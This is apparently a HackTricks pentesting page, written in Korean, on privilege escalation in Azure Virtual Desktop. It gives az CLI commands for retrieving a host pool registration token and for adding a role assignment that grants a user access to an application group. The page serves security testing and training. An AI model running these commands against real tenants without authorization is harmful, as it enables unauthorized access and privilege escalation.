# Az - Virtual Desktop Privesx

{{#include ../../../banners/hacktricks-training.md}}

## Azure Virtual Desktop Privesc

Azure Virtual Desktop에 대한 자세한 내용은 다음을 확인하세요:

{{#ref}}
../az-services/az-virtual-desktop.md
{{#endref}}


### `Microsoft.DesktopVirtualization/hostPools/retrieveRegistrationToken/action`
호스트 풀 내에서 가상 머신을 등록하는 데 사용되는 등록 토큰을 검색할 수 있습니다.
```bash
az desktopvirtualization hostpool retrieve-registration-token -n testhostpool -g Resource_Group_1
```
### Microsoft.Authorization/roleAssignments/read, Microsoft.Authorization/roleAssignments/write

> [!WARNING]
> 이러한 권한을 가진 공격자는 이보다 훨씬 더 위험한 일을 할 수 있습니다.

이 권한을 사용하면 가상 데스크톱의 가상 머신에 접근하는 데 필요한 애플리케이션 그룹에 사용자 할당을 추가할 수 있습니다:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP_NAME>/providers/Microsoft.DesktopVirtualization/applicationGroups/<APP_GROUP_NAME>/providers/Microsoft.Authorization/roleAssignments/<NEW_ROLE_ASSIGNMENT_GUID>?api-version=2022-04-01" \
--body '{
"properties": {
"roleDefinitionId": "/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleDefinitions/1d18fff3-a72a-46b5-b4a9-0b38a3cd7e63",
"principalId": "<USER_OBJECT_ID>"
}
}'
```
사용자가 데스크탑이나 앱에 접근할 수 있으려면, VM에 대해 `Virtual Machine User Login` 또는 `Virtual Machine Administrator Login` 역할이 필요합니다. 

{{#include ../../../banners/hacktricks-training.md}}
